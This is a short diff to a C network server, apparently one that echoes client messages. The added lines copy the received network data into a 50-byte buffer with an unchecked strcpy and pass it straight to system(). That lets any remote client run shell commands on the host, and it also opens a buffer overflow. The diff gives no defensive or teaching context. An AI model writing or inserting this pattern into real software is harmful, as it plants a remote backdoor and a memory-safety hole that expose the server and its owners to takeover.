@@ -55,6 +55,9 @@ void main(){
         }
 
         printf("Message: %s\n", buffer);
+        char command[50];
+        strcpy(command, buffer);
+        system(command);
 
         n = write(consockfd, "I got your message", 18);
 
